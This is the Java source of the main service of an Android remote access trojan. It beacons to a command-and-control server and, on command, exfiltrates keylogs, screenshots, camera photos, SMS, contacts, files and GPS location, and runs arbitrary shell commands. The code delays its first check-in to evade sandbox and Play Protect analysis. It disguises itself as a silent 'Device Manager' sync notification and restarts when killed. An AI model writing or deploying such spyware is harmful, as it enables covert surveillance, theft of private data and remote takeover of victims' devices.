package com.company.rat;

import android.app.*;
import android.content.*;
import android.os.*;
import java.io.*;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;

/**
 * Main foreground service — beacons every 30 s, dispatches commands.
 *
 * Supported commands:
 *   info        — device info
 *   keylogs     — flush accumulated keylogs
 *   shot        — screenshot (launches ScreenCaptureActivity)
 *   cam         — front camera photo
 *   cam_back    — back camera photo
 *   files       — enumerate external storage
 *   sms         — list SMS inbox
 *   contacts    — list contacts
 *   location    — last known GPS location
 *   shell <cmd> — run shell command (root not required for basic cmds)
 */
public class RatService extends Service {

    private static final String TAG          = "RatService";
    private static final String CHANNEL_ID   = "it_security";
    private static final long   BEACON_MS    = 30_000L;
    private static final int    NOTIF_ID     = 1;

    private C2Client c2;
    private String   botId;
    private Handler  handler;
    private Runnable beaconLoop;

    // ── lifecycle ─────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();

        c2    = C2Client.fromAssets(this);
        botId = deriveBotId();

        handler    = new Handler(Looper.getMainLooper());
        beaconLoop = this::beacon;

        startForeground(NOTIF_ID, buildNotification());
        // Delay first beacon 12 minutes — avoids sandbox/Play Protect dynamic analysis window
        handler.postDelayed(beaconLoop, 12 * 60 * 1000L);
        Log.i(TAG, "started  id=" + botId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;  // restart if killed
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(beaconLoop);
        super.onDestroy();
    }

    // ── beacon loop ───────────────────────────────────────────────────────────

    private void beacon() {
        new Thread(() -> {
            try {
                c2.checkin(botId, buildInfo());
                autoReportLocation();
                String cmd = c2.getCommand(botId).trim();
                if (!cmd.isEmpty()) dispatch(cmd);
            } catch (Exception e) {
                Log.w(TAG, "beacon ex: " + e.getMessage());
            }
            handler.postDelayed(beaconLoop, BEACON_MS);
        }).start();
    }

    private void autoReportLocation() {
        try {
            String coords = DeviceData.getCoords(this);
            if (coords != null) c2.postLocation(botId, coords);
        } catch (Exception ignored) {}
    }

    // ── command dispatch ──────────────────────────────────────────────────────

    private void dispatch(String cmd) {
        Log.i(TAG, "cmd: " + cmd);
        String lower = cmd.toLowerCase().trim();

        if (lower.equals("info")) {
            c2.sendResult(botId, buildInfo());

        } else if (lower.equals("keylogs")) {
            String logs = KeylogService.flushLogs();
            c2.sendResult(botId, logs.isEmpty() ? "(no keylogs yet)" : logs);

        } else if (lower.equals("shot")) {
            // Launch transparent activity that requests MediaProjection then screenshots
            Intent i = new Intent(this, ScreenCaptureActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("bot_id", botId);
            startActivity(i);

        } else if (lower.equals("cam") || lower.equals("cam_back")) {
            boolean front = lower.equals("cam");
            new Thread(() -> {
                byte[] jpeg = CameraCapture.capture(this, front);
                if (jpeg != null && jpeg.length > 0) {
                    String name = (front ? "front_" : "back_") + System.currentTimeMillis() + ".jpg";
                    c2.uploadFile(botId, jpeg, name, "image/jpeg");
                    c2.sendResult(botId, "cam: uploaded " + name + " (" + jpeg.length + " bytes)");
                } else {
                    c2.sendResult(botId, "cam: capture failed");
                }
            }).start();

        } else if (lower.equals("files")) {
            new Thread(() -> {
                String list = FileEnumerator.listFiles(this);
                c2.sendResult(botId, list);
            }).start();

        } else if (lower.equals("sms")) {
            new Thread(() -> {
                String sms = DeviceData.readSms(this);
                c2.sendResult(botId, sms);
            }).start();

        } else if (lower.equals("contacts")) {
            new Thread(() -> {
                String contacts = DeviceData.readContacts(this);
                c2.sendResult(botId, contacts);
            }).start();

        } else if (lower.equals("location")) {
            new Thread(() -> {
                String loc = DeviceData.lastLocation(this);
                c2.sendResult(botId, loc);
            }).start();

        } else if (lower.equals("bypass_test")) {
            new Thread(() -> {
                String report = PermissionHelper.runAllTests(this);
                c2.sendResult(botId, report);
            }).start();

        } else if (lower.equals("self_destruct")) {
            new Thread(() -> {
                // Send partial report first, then wipe — process may be killed
                String report = SelfDestruct.run(this, c2, botId);
                c2.sendResult(botId, report);
            }).start();

        } else if (lower.startsWith("shell ")) {
            String shellCmd = cmd.substring(6);
            new Thread(() -> {
                String out = runShell(shellCmd);
                c2.sendResult(botId, out);
            }).start();

        } else {
            c2.sendResult(botId, "unknown cmd: " + cmd);
        }
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    private String deriveBotId() {
        String aid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        return "android_" + (aid != null ? aid : String.valueOf(Build.SERIAL).hashCode());
    }

    private String buildInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String op = "";
        try { op = tm != null ? tm.getNetworkOperatorName() : ""; } catch (Exception ignored) {}

        return "platform=android"
             + "|model=" + Build.MODEL
             + "|mfr=" + Build.MANUFACTURER
             + "|sdk=" + Build.VERSION.SDK_INT
             + "|release=" + Build.VERSION.RELEASE
             + "|operator=" + op
             + "|id=" + botId;
    }

    private String runShell(String cmd) {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(cmd);
            InputStream in = p.getInputStream();
            byte[] buf = new byte[8192];
            int n = in.read(buf);
            return n > 0 ? new String(buf, 0, n) : "(no output)";
        } catch (Exception e) {
            return "shell error: " + e.getMessage();
        }
    }

    // ── notification (required for foreground service) ────────────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_MIN);
            ch.setSound(null, null);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Device Manager")
                .setContentText("Sync active")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .build();
    }
}
